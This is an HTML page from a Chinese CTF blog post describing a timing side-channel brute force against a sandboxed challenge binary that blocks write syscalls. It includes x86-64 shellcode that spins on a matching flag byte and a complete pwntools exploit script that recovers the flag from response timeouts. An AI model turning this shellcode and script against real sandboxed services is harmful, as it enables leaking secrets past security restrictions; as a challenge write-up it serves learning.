@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>测信道爆破 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">测信道爆破</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十月 9, 2024&nbsp;&nbsp;21:26:06</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="测信道爆破攻击"><a href="#测信道爆破攻击" class="headerlink" title="测信道爆破攻击"></a>测信道爆破攻击</h1><p><img src="/../image/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/1.png" alt="1"></p>
+<p>ORW缺少w，开启白名单限制，无法通过sendfile，mmap，retfq等手段绕过沙箱</p>
+<p>测信道爆破本质就是对flag进行逐字节爆破，进行比对从而逐字节爆破flag</p>
+<p>核心部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,rsp</span><br><span class="line">mov bl, byte ptr [rax+&#123;&#125;]</span><br><span class="line">cmp bl, &#123;&#125;</span><br><span class="line">jz $-0x3 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以通过pwntools中<code>recv（timeout=NUM）</code>来检查是否爆破成功，若字节对应，则会陷入死循环，让recv等待。若字节不对应，则可以利用沙箱的机制让其执行不可执行的函数引发错误导致程序退出从而recv无法等待NUM秒进而报错。</p>
+<h1 id="处理方法"><a href="#处理方法" class="headerlink" title="处理方法"></a>处理方法</h1><p>完整的payload一般为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">payload=asm(pay)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,rsp</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pay=payload+asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))+asm(shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+
+<p>cmp会把bl与{}中内容比较，若内容相同cmp结果为0，ZF为被设置为1，jz往前跳转三个字节重复执行cmp陷入死循环。</p>
+<p>其中list为需要爆破的字典，index为flag的字节索引</p>
+<p>另外需要python的异常处理语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r.recv(timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="comment">#进行异常处理</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="comment">#正常执行处理爆破出的flag字节</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/mrbw/Desktop/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./1&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">pay=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">payload=asm(pay)</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = <span class="string">&quot;fb_&#123;&#125;lagf0123456789&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">       r=process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">       <span class="comment">#r=process(&#x27;./1&#x27;)</span></span><br><span class="line">       pay=payload+asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))+asm(shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">      <span class="comment"># print(s[i])</span></span><br><span class="line">       <span class="comment">#gdb.attach(r)</span></span><br><span class="line">       sl(pay)</span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">            judge=r.recv(timeout=<span class="number">2</span>)</span><br><span class="line">       <span class="keyword">except</span>:</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            index=index+<span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/2.png" alt="2"></p>
+<p>s为爆破字节的字典，此处flag为我本地flag，连接远程服务器时可能需要扩大字典范围</p>
+<p>可以开多个终端进行多线程爆破，只需在<code>shellcode.format(index,list[i])</code>这一行的index改成index+n即可</p>
+<p>另外，连接远程服务器有时可能因为延迟导致报错后连接不能及时的断开，导致recv以为程序没有结束运行，进而把不匹配的字符添加到flag中，因此连接远程服务器的时候需要<code>recv(timeout=NUM)</code>中NUM尽可能设置大一点</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/sandbox/"># sandbox</a>
+                    
+                        <a href="/tags/shellcode/"># shellcode</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/10/08/%E7%A6%81%E7%94%A8syscall%E7%9A%84shellcode/">禁用syscall的shellcode</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
